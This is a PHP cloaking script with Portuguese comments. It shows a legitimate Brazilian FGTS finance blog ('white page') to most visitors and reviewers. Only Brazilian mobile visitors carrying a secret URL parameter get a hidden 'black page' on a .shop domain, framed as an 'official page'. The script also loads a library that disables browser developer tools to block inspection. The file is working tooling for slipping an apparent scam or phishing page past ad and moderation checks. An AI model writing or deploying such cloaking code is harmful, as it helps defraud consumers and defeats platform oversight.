<?php
// Configurações das páginas
$whitePage = "https://meutudo.com.br/blog/lucro-fgts/";
$blackPage = "https://portalinfos.shop/gv-lista-r/inicio/";

$NomeParametroSeguro = "UQlCLdcHVbZq";
$ValorParametroSeguro = "LBowyMFwmgeO";



// Função para verificar dispositivo móvel
function isMobileDevice()
{
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return preg_match('/iphone|ipod|ipad|android|blackberry|windows phone/', $userAgent);
}

// Recuperar país do IP
function getCountryFromIP($ip)
{
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($apiUrl);
    $data = json_decode($response, true);
    return $data['countryCode'] ?? null;
}

// Verificar se o parâmetro de segurança está presente
function checkParam($name, $value)
{
    if (isset($_GET[$name]) && $_GET[$name] == $value) {
        return true;
    }
    return false;
}

// Variáveis do usuário
$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountryFromIP($ip);
$isMobile = isMobileDevice();
$paramValid = checkParam($NomeParametroSeguro, $ValorParametroSeguro);

// Determinar qual página exibir
$showBlackPage = $isMobile && $country === 'BR' && $paramValid;

if (!$showBlackPage)
    header("Location: " . $whitePage);
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?= $showBlackPage ? "Página Oficial" : "Página" ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        iframe {
            border: none;
            width: 100%;
            height: 100vh;
        }
    </style>
</head>

<body>
    <?php
    if ($showBlackPage):
        setcookie('cks_21831931', 'validate', time() + 3600, "/");
        ?>
        <!-- Exibe a BlackPage -->
        <iframe src="<?= $blackPage . '?' . $_SERVER['QUERY_STRING'] ?>"></iframe>
    <?php else: ?>
        <!-- Exibe a WhitePage -->
        <iframe src="<?= $whitePage . '?' . $_SERVER['QUERY_STRING'] ?>&cks=lw5Mm45kD2jL"></iframe>
    <?php endif; ?>
    <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
</body>

</html>